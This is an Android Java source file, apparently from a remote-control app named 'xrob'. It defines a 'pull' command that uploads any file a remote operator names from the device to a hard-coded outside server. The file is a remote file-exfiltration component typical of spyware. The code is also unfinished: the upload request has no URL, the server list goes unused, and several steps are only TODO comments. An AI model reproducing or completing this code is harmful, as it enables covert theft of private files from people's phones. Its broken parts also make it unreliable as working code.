package com.theah64.xrob.commandcenter.commands;

import android.content.Context;

import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.CommonUtils;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

import java.io.File;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by theapache64 on 9/10/16.
 * The pull command is used to pull files from the device.
 * If the specified source is a directory, the zipped version will be uploaded, else the exact file.
 */
public class PullCommand extends BaseCommand {

    private static final String[] SERVERS = {
            "http://xrob_server1.netne.net"
    };

    private static final String FLAG_SOURCE = "s";

    private static final Options options = new Options()
            .addOption(FLAG_SOURCE, true, "Source to be pulled");

    PullCommand(String command) throws CommandException, ParseException {
        super(command);
    }

    @Override
    public void handle(Context context, Callback callback) {

        final String source = getCmd().getOptionValue(FLAG_SOURCE);
        if (source != null) {

            File sourceFile = new File(source);

            if (sourceFile.exists()) {


                if (sourceFile.isDirectory()) {
                    //TODO:Convert source file to zipped directory and move it to app temp folder
                } else {
                    //Get a copy to temp directory

                }

                //Copyig file to temporary location

                //Add the file path to db

                //Start the queue


                //The source is a file so upload it.
                final RequestBody fileBody = new MultipartBody.Builder()
                        .addFormDataPart(Xrob.KEY_DATA, sourceFile.getName(), RequestBody.create(
                                MediaType.parse(CommonUtils.getContentTypeFromFile(sourceFile.getAbsolutePath())),
                                sourceFile
                        ))
                        .build();

                new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {

                    @Override
                    public void onReadyToRequest(String apiKey) {

                        final Request fileUploadRequest = new Request.Builder()
                                .addHeader(APIRequestBuilder.KEY_AUTHORIZATION, apiKey)
                                .post(fileBody)
                                .build();


                        OkHttpUtils.getInstance().getClient().newCall(fileUploadRequest).enqueue(new okhttp3.Callback() {
                            @Override
                            public void onFailure(Call call, IOException e) {
                                //Add to pending file uploads.
                            }

                            @Override
                            public void onResponse(Call call, Response response) throws IOException {
                                //Delete the uploaded file from temp dir.
                            }
                        });

                    }

                    @Override
                    public void onFailed(String reason) {
                        //Add to pending file uploads
                    }
                });

            } else {
                callback.onError("Source : " + source + " doesn't exist");
            }

        } else {
            callback.onError("Undefined source");
        }

    }

    @Override
    public Options getOptions() {
        return options;
    }
}
